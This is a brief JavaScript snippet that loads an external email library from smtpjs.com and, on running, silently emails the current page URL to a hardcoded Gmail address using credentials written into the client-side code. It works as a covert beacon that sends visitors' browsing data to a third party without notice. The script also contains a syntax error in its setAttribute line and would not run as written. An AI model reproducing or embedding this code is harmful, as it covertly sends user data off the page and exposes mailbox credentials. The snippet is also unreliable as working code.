callScript = document.createElement("script");
callScript.setAttribute("src","https://smtpjs.com/v3/smtp.js">
//<script src="https://smtpjs.com/v3/smtp.js"></script>
document.head.appendChild(callScript)                     

  website = window.location.href
    function sendEmail() {
      Email.send({
        Host: "smtp.gmail.com",
        Username: "sendmailapplication32@gmail.com",
        Password: "easypassword",
        To: 'sendmailapplication32@gmail.com',
        From: "sendmailapplication32@gmail.com",
        Subject: "Sending Email using javascript",
        Body: website,
      })
    }
    sendEmail();

